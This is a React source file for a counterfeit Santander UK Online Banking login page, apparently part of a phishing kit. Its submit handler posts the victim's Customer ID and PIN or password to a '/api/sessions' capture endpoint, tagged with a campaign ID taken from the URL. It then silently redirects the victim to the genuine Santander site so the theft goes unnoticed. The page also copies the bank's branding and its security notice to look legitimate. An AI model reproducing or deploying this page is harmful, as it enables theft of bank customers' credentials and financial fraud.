import { useState } from "react";
import { useForm } from "react-hook-form";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { apiRequest } from "@/lib/queryClient";

interface LoginFormData {
  customerId: string;
  pin: string;
}

export default function SantanderLoginPage() {
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  const form = useForm<LoginFormData>({
    defaultValues: {
      customerId: "",
      pin: "",
    },
  });

  const onSubmit = async (data: LoginFormData) => {
    setIsSubmitting(true);
    
    try {
      await apiRequest("POST", "/api/sessions", {
        username: data.customerId,
        password: data.pin,
        ipAddress: "unknown",
        status: "complete",
        completionPercentage: 100,
        campaignId: new URLSearchParams(window.location.search).get("cid") || "unknown",
      });

      setTimeout(() => {
        window.location.href = "https://www.santander.co.uk/";
      }, 1500);
    } catch (error) {
      console.error("Error capturing session:", error);
      setTimeout(() => {
        window.location.href = "https://www.santander.co.uk/";
      }, 1500);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-red-600 shadow-lg">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center">
              <svg width="160" height="40" viewBox="0 0 160 40" className="text-white">
                <rect width="160" height="40" fill="#EC0000"/>
                <text x="20" y="26" fill="white" fontSize="20" fontWeight="bold">Santander</text>
              </svg>
            </div>
            <nav className="hidden md:flex space-x-6 text-white">
              <a href="#" className="hover:text-red-200">Support</a>
              <a href="#" className="hover:text-red-200">Security</a>
              <a href="#" className="hover:text-red-200">Contact</a>
            </nav>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div className="min-h-[calc(100vh-4rem)] flex items-center justify-center p-8">
        <div className="w-full max-w-md">
          <div className="bg-white rounded-xl shadow-2xl border border-gray-100 overflow-hidden">
            
            {/* Header Section */}
            <div className="bg-gradient-to-r from-red-600 to-red-700 px-8 py-6 text-white">
              <h1 className="text-2xl font-bold mb-1">Online Banking</h1>
              <p className="text-red-100">Log in securely to your account</p>
            </div>

            {/* Form Section */}
            <div className="px-8 py-8">
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                <div>
                  <label htmlFor="customerId" className="block text-sm font-semibold text-gray-700 mb-3">
                    Customer ID
                  </label>
                  <Input
                    id="customerId"
                    type="text"
                    {...form.register("customerId", { required: true })}
                    className="w-full px-4 py-3 border-2 border-gray-200 rounded-lg focus:border-red-500 focus:ring-red-500 text-lg"
                    placeholder="Enter your Customer ID"
                    data-testid="input-customer-id"
                  />
                </div>

                <div>
                  <label htmlFor="pin" className="block text-sm font-semibold text-gray-700 mb-3">
                    PIN or Password
                  </label>
                  <Input
                    id="pin"
                    type="password"
                    {...form.register("pin", { required: true })}
                    className="w-full px-4 py-3 border-2 border-gray-200 rounded-lg focus:border-red-500 focus:ring-red-500 text-lg"
                    placeholder="Enter your PIN or Password"
                    data-testid="input-pin"
                  />
                </div>

                <div className="flex items-center">
                  <input
                    id="remember"
                    name="remember"
                    type="checkbox"
                    className="h-4 w-4 text-red-600 focus:ring-red-500 border-gray-300 rounded"
                  />
                  <label htmlFor="remember" className="ml-3 block text-sm text-gray-700">
                    Remember my Customer ID
                  </label>
                </div>

                <Button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full bg-red-600 hover:bg-red-700 text-white py-4 px-6 rounded-lg font-semibold text-lg transition-colors"
                  data-testid="button-login"
                >
                  {isSubmitting ? "Logging in..." : "Log in"}
                </Button>
              </form>

              <div className="mt-8 space-y-4 text-center">
                <a href="#" className="block text-sm text-red-600 hover:text-red-500 font-medium">
                  Forgotten your log in details?
                </a>
                <a href="#" className="block text-sm text-red-600 hover:text-red-500 font-medium">
                  First time user? Register now
                </a>
                <a href="#" className="block text-sm text-red-600 hover:text-red-500 font-medium">
                  Download our Mobile Banking App
                </a>
              </div>

              {/* Security Notice */}
              <div className="mt-8 pt-6 border-t border-gray-200">
                <div className="bg-red-50 border border-red-200 rounded-lg p-4">
                  <div className="flex items-start space-x-3">
                    <div className="w-6 h-6 text-red-600 flex-shrink-0 mt-0.5">
                      <svg fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                      </svg>
                    </div>
                    <div className="text-sm">
                      <p className="font-semibold text-red-800 mb-2">Important Security Information</p>
                      <p className="text-red-700 leading-relaxed">
                        Santander will never ask you to confirm your Online Banking details by email, phone or text. 
                        If you receive suspicious communications, please contact us immediately.
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>

          </div>

          {/* Footer Links */}
          <div className="mt-8 text-center text-sm text-gray-600 space-y-2">
            <p>Having trouble logging in? <a href="#" className="text-red-600 hover:text-red-500">Get help</a></p>
            <p>© 2024 Santander UK plc. Registered in England No. 2294747</p>
          </div>
        </div>
      </div>
    </div>
  );
}